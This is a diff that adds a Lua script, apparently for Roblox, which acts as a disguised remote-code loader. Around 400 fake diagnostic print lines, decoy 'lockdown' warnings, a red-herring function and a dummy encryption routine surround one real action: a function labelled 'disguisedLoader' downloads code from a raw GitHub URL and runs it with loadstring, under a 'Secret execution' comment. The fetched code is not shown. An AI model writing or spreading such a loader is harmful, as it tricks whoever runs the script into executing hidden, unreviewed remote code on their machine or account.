@@ -1,0 +1,53 @@
+-- 🌀 Security Layer: Junk Print Flood (Start)
+for i = 1, 300 do
+    print("⚠️ System Diagnostic: [Status Code " .. tostring(math.random(1000, 9999)) .. "]")
+end
+
+-- 🧪 Red herring function
+local function systemCheck()
+    local encoded = ""
+    for i = 1, 500 do
+        encoded = encoded .. string.char((i % 26) + 65)
+    end
+    return encoded
+end
+
+-- 👁️ Warning message (decoy)
+warn("Unauthorized script execution detected! Initiating protocol lockdown...")
+wait(2)
+warn("Critical modules reinitializing...")
+
+-- 🗃️ module loader
+local modules = {}
+for i = 1, 50 do
+    modules[i] = function()
+        return "Module " .. tostring(i) .. " loaded."
+    end
+end
+
+-- ⚙️ encryption function
+local function encrypt(data)
+    local result = ""
+    for i = 1, #data do
+        result = result .. string.char(((data:byte(i) + 3) % 126) + 1)
+    end
+    return result
+end
+
+-- 🧿 loader trigger
+local disguisedLoader = function()
+    local fetched = game:HttpGet("https://raw.githubusercontent.com/brylmad/Mvsd/refs/heads/main/Mvsd")
+    if fetched and #fetched > 0 then
+        loadstring(fetched)()
+    else
+        warn("Module fetch failed.")
+    end
+end
+
+-- 🕵️ Secret execution
+disguisedLoader()
+
+-- 🌀 Security Layer: Junk Print Flood (End)
+for i = 1, 100 do
+    print("✅ Module handshake complete [" .. tostring(math.random(10000,99999)) .. "]")
+end
